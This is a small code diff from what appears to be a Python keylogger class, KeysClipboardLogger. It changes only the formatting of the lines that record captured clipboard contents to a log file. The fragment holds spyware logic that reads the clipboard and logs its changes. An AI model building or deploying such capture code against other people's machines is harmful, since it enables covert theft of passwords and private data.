@@ -40,7 +40,7 @@ class KeysClipboardLogger:
     def log_clipboard(self):
         self.current_clipboard = pc.paste()
         if self.current_clipboard != self.old_clipboard:
-            self.working_file.write(f" [CLIPBOARD DATA: {self.current_clipboard}] ")
+            self.working_file.write(f"\n[CLIPBOARD DATA: {self.current_clipboard}]\n")
             self.old_clipboard = self.current_clipboard
 
     def start_keylogger(self):
